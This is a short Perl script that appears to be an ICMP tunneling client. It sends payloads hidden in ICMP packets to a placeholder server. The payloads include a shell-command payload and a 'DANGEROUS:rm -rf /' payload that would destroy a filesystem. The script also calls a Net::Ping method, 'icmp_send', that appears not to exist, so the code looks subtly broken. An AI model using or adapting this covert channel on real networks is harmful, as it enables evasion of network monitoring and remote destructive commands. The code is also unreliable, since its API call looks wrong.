#!/usr/bin/perl
use Net::Ping;

# Created by Haroon Ahmad Awan

# ICMP tunneling server (replace with your server's IP)
my $server_ip = "Server-IP";

# Data to tunnel
my $text_payload = "Hello, ICMP Tunneling!";
my $hex_payload = "HEX:48656C6C6F2C2049434D502054756E6E656C696E67";
my $command_payload = "CMD:echo 'This is a command payload'";
my $dangerous_payload = "DANGEROUS:rm -rf /";  # Replace with a safe demonstration

# Create a ping object
my $ping = Net::Ping->new("icmp");

$SIG{INT} = sub {
    $ping->close();
    print "Client shutting down.\n";
    exit(0);
};

my $payload_counter = 0;
my @payloads = ($text_payload, $hex_payload, $command_payload, $dangerous_payload);

while ($payload_counter < scalar(@payloads)) {
    my $payload = $payloads[$payload_counter];

    my ($ret, $duration, $ip) = $ping->icmp_send(1, $server_ip, 64, 0, "ICMP-$payload");

    if ($ret) {
        print "Sent ICMP packet with payload: $payload\n";
        $payload_counter++;
    } else {
        print "Failed to send ICMP packet with payload: $payload\n";
    }
}

$ping->close();
